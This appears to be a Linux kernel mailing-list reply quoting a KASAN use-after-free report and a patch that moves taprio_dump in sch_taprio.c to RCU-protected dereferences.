>      addrconf_ifdown.isra.0+0x13af/0x1970 net/ipv6/addrconf.c:3957
>      addrconf_notify+0x105/0x1210 net/ipv6/addrconf.c:3727
>      notifier_call_chain+0xba/0x3d0 kernel/notifier.c:93
>      call_netdevice_notifiers_info+0xbe/0x130 net/core/dev.c:1967
>      call_netdevice_notifiers_extack net/core/dev.c:2005 [inline]
>      call_netdevice_notifiers net/core/dev.c:2019 [inline]
>      unregister_netdevice_many_notify+0x6e2/0x1460 net/core/dev.c:11040
>      vti6_exit_batch_net+0x37d/0x3f0 net/ipv6/ip6_vti.c:1188
>      ops_exit_list+0x125/0x170 net/core/net_namespace.c:175
>      cleanup_net+0x4ee/0x9d0 net/core/net_namespace.c:614
>      process_one_work+0x830/0x1540 kernel/workqueue.c:2630
>      process_scheduled_works kernel/workqueue.c:2703 [inline]
>      worker_thread+0x855/0x11f0 kernel/workqueue.c:2784
>      kthread+0x346/0x450 kernel/kthread.c:388
>      ret_from_fork+0x45/0x80 arch/x86/kernel/process.c:147
>      ret_from_fork_asm+0x11/0x20 arch/x86/entry/entry_64.S:242
>
>     The buggy address belongs to the object at ffff88805d203c00
>      which belongs to the cache kmalloc-512 of size 512
>     The buggy address is located 192 bytes inside of
>      freed 512-byte region [ffff88805d203c00, ffff88805d203e00)
>
>     The buggy address belongs to the physical page:
>     page:ffffea0001748000 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x5d200
>     head:ffffea0001748000 order:2 entire_mapcount:0 nr_pages_mapped:0 pincount:0
>     flags: 0xfff00000000840(slab|head|node=0|zone=1|lastcpupid=0x7ff)
>     page_type: 0xffffffff()
>     raw: 00fff00000000840 ffff88800cc41c80 dead000000000100 dead000000000122
>     raw: 0000000000000000 0000000000100010 00000001ffffffff 0000000000000000
>     page dumped because: kasan: bad access detected
>     page_owner tracks the page as allocated
>     page last allocated via order 2, migratetype Unmovable, gfp_mask 0x1d2040(__GFP_IO|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_HARDWALL), pid 10126, tgid 10126 (kworker/u5:5), ts 66769655423, free_ts 66738009716
>      set_page_owner include/linux/page_owner.h:31 [inline]
>      post_alloc_hook+0x2d8/0x350 mm/page_alloc.c:1537
>      prep_new_page mm/page_alloc.c:1544 [inline]
>      get_page_from_freelist+0x8a8/0xeb0 mm/page_alloc.c:3312
>      __alloc_pages+0x1cb/0x4a0 mm/page_alloc.c:4568
>      alloc_pages_mpol+0x245/0x5e0 mm/mempolicy.c:2133
>      alloc_slab_page mm/slub.c:1870 [inline]
>      allocate_slab+0x261/0x390 mm/slub.c:2017
>      ___slab_alloc+0x967/0x11b0 mm/slub.c:3223
>      __slab_alloc.constprop.0+0x56/0xa0 mm/slub.c:3322
>      __slab_alloc_node mm/slub.c:3375 [inline]
>      slab_alloc_node mm/slub.c:3468 [inline]
>      __kmem_cache_alloc_node+0x2c6/0x340 mm/slub.c:3517
>      kmalloc_trace+0x26/0xe0 mm/slab_common.c:1098
>      kmalloc include/linux/slab.h:600 [inline]
>      kzalloc include/linux/slab.h:721 [inline]
>      tomoyo_find_next_domain+0xd5/0x1630 security/tomoyo/domain.c:710
>      tomoyo_bprm_check_security+0x137/0x1c0 security/tomoyo/tomoyo.c:101
>      security_bprm_check+0x49/0xb0 security/security.c:1103
>      search_binary_handler+0xde/0x6e0 fs/exec.c:1725
>      exec_binprm+0x146/0x770 fs/exec.c:1779
>      bprm_execve+0x1f2/0x6a0 fs/exec.c:1854
>      kernel_execve+0x3ba/0x4b0 fs/exec.c:2022
>     page last free stack trace:
>      reset_page_owner include/linux/page_owner.h:24 [inline]
>      free_pages_prepare mm/page_alloc.c:1137 [inline]
>      free_unref_page_prepare+0x4c6/0xb20 mm/page_alloc.c:2347
>      free_unref_page+0x33/0x3d0 mm/page_alloc.c:2487
>      __unfreeze_partials+0x1fb/0x210 mm/slub.c:2655
>      qlink_free mm/kasan/quarantine.c:168 [inline]
>      qlist_free_all+0x6a/0x170 mm/kasan/quarantine.c:187
>      kasan_quarantine_reduce+0x18e/0x1d0 mm/kasan/quarantine.c:294
>      __kasan_slab_alloc+0x63/0x90 mm/kasan/common.c:305
>      kasan_slab_alloc include/linux/kasan.h:188 [inline]
>      slab_post_alloc_hook mm/slab.h:763 [inline]
>      slab_alloc_node mm/slub.c:3478 [inline]
>      slab_alloc mm/slub.c:3486 [inline]
>      __kmem_cache_alloc_lru mm/slub.c:3493 [inline]
>      kmem_cache_alloc+0x163/0x390 mm/slub.c:3502
>      getname_flags+0xd6/0x5c0 fs/namei.c:140
>      do_sys_openat2+0xe8/0x1c0 fs/open.c:1434
>      do_sys_open fs/open.c:1455 [inline]
>      __do_sys_openat fs/open.c:1471 [inline]
>      __se_sys_openat fs/open.c:1466 [inline]
>      __x64_sys_openat+0x140/0x1f0 fs/open.c:1466
>      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
>      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
>      entry_SYSCALL_64_after_hwframe+0x63/0x6b
>
>     Memory state around the buggy address:
>      ffff88805d203b80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>      ffff88805d203c00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
>     >ffff88805d203c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
>                                                ^
>      ffff88805d203d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
>      ffff88805d203d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
>     ==================================================================
>
> patch:
>
> Signed-off-by: Team p0pk3rn <bob.p0pk3rn@gmail.com>
> Reported-by: Team p0pk3rn <bob.p0pk3rn@gmail.com>
> Fixes: 18cdd2f0998a ("net/sched: taprio: taprio_dump and taprio_change are protected by rtnl_mutex")
> ---
>  net/sched/sch_taprio.c | 7 +++++--
>  1 file changed, 5 insertions(+), 2 deletions(-)
>
> diff --git a/net/sched/sch_taprio.c b/net/sched/sch_taprio.c
> index 31a8252bd09c..0b7b3e462f1a 100644
> --- a/net/sched/sch_taprio.c
> +++ b/net/sched/sch_taprio.c
> @@ -2394,8 +2394,9 @@ static int taprio_dump(struct Qdisc *sch, struct sk_buff *skb)
>  	struct tc_mqprio_qopt opt = { 0 };
>  	struct nlattr *nest, *sched_nest;
>  
> -	oper = rtnl_dereference(q->oper_sched);
> -	admin = rtnl_dereference(q->admin_sched);
> +	rcu_read_lock();
> +	oper = rcu_dereference(q->oper_sched);
> +	admin = rcu_dereference(q->admin_sched);
>  
>  	mqprio_qopt_reconstruct(dev, &opt);
>  
> @@ -2436,6 +2437,7 @@ static int taprio_dump(struct Qdisc *sch, struct sk_buff *skb)
>  	nla_nest_end(skb, sched_nest);
>  
>  done:
> +	rcu_read_unlock();
>  	return nla_nest_end(skb, nest);
>  
>  admin_error:
> @@ -2445,6 +2447,7 @@ static int taprio_dump(struct Qdisc *sch, struct sk_buff *skb)
>  	nla_nest_cancel(skb, nest);
>  
>  start_error:
> +	rcu_read_unlock();
>  	return -ENOSPC;
>  }
>  
> -- 
> 2.34.1
>

-- 
Vinicius

